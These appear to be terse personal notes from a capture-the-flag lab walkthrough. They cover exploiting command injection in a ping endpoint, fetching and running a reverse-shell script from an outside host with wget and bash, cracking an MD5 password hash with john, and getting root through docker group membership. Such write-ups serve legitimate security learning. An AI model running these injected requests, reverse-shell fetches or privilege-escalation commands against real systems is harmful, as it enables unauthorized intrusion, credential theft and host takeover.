the initial foothold was something new
it was command injection, that was only caught when seeing the burp
The 31331 port had a background request that sent a request like
GET /ping?ip=10.10.x.x HTTP/1.1
This was base for the command injection
change the request as GET /ping?ip=\`ls\` HTTP/1.1 (without the backslash, but with quote)
This meant any command written there would be executed
Used this to serve a reverse shell, and modified the req as
GET /ping?ip=\`wget+http://10.17.34.38/rshell_lin.sh\` HTTP/1.1
GET /ping?ip=\`bash+rshell_lin.sh\` HTTP/1.1
gave us the reverse shell! www-data
there was utech.db.mysql, with user r00t's password hashed md5
`john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt --format="raw-md5" --fork=32` to crack it, gave password
su
none of the usual privesc were useful
id --> showed we belonged to "docker" group
so, gtfo bins for docker, showed
`docker run -v /:/mnt --rm -it bash chroot /mnt sh`
root!